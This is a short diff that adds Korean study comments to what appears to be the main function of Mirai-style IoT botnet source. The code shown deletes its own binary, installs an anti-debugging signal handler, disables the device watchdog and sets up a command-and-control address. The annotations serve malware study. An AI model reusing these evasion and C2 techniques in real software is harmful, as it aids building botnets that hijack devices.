@@ -58,16 +58,28 @@ int main(int argc, char **args)
     int wfd;
 
     // Delete self
-    unlink(args[0]);
+    unlink(args[0]); 
+	// 자기 자신을 삭제한다. Unlink == Remove
 
     // Signal based control flow
-    sigemptyset(&sigs);
-    sigaddset(&sigs, SIGINT);
-    sigprocmask(SIG_BLOCK, &sigs, NULL);
-    signal(SIGCHLD, SIG_IGN);
-    signal(SIGTRAP, &anti_gdb_entry);
+	// 신호 생성
+    sigemptyset(&sigs); // 시그널 빈 집합 생성 함수
+    sigaddset(&sigs, SIGINT); // 시그널 집합에 시그널 추가 
+	// SIGINT : 터미널에서 인터럽트 키 중의 하나인 Ctrl-C 를 눌렀을 때 발생하며, 프로세스는 종료됩니다.
+    sigprocmask(SIG_BLOCK, &sigs, NULL); // 시그널 대기 상태로 설정
+	// SIG_BLOCK : 	기존에 블록화된 시그널 집합에 두 번째 인수 set 시그널 집합을 추가
+	// ;
+    signal(SIGCHLD, SIG_IGN); // 시그널 처리 방법을 설정
+	// SIGCHLD : 이 시그널은 자식 프로세스들중의 하나라도 종료되거나 멈출 때마다 부모 프로세스에게 보내어진다. 이 시그널을 위한 디폴트 동작은 그것을 무시하는 것이다. 만일 당신이 wait 또는 waitpid를거쳐 (23. 6절 [Process Completion] 참조. ) 그들의 상황이 보고되지 않았지만, 종료된 자식 프로세스에서 발생한 시그널을 위한 핸들러를 만든다면, 당신의 새로운 핸들러가 그들 프로세스에 적용이 되던지 또는 특정한 운영체제에 달려있다.
+	// SIG_ING : 시그널을 무시한다.
+    signal(SIGTRAP, &anti_gdb_entry); // 시그널 처리 방법을 설정
+	// SIGTRAP : 기계상의 중단점 명령에 의해 발생 된다. 디버거에 의해 사용된다. 디폴트 동작은 코어를 덤프하는 것이다.
+	// 발생시 anti_gdb_entry를 실행 
+	// => 안티 디버깅 기법으로 사용되는 것 같음.
 
-    // Prevent watchdog from rebooting device
+    // Prevent watchdog from rebooting device -> 장치 재부팅 방지 및 Watchdog 방지?
+	// 워치독 : https://ko.wikipedia.org/wiki/%EC%9B%8C%EC%B9%98%EB%8F%85_%ED%83%80%EC%9D%B4%EB%A8%B8
+	// 
     if ((wfd = open("/dev/watchdog", 2)) != -1 ||
         (wfd = open("/dev/misc/watchdog", 2)) != -1)
     {
@@ -100,11 +112,11 @@ int main(int argc, char **args)
         perror("sigaction");
 #endif
 
-    LOCAL_ADDR = util_local_addr();
+    LOCAL_ADDR = util_local_addr(); // 자기 자신의 IP 정보를 얻음
 
     srv_addr.sin_family = AF_INET;
-    srv_addr.sin_addr.s_addr = FAKE_CNC_ADDR;
-    srv_addr.sin_port = htons(FAKE_CNC_PORT);
+    srv_addr.sin_addr.s_addr = FAKE_CNC_ADDR; // FAKE?
+    srv_addr.sin_port = htons(FAKE_CNC_PORT); // FAKE?
 
 #ifdef DEBUG
     unlock_tbl_if_nodebug(args[0]);
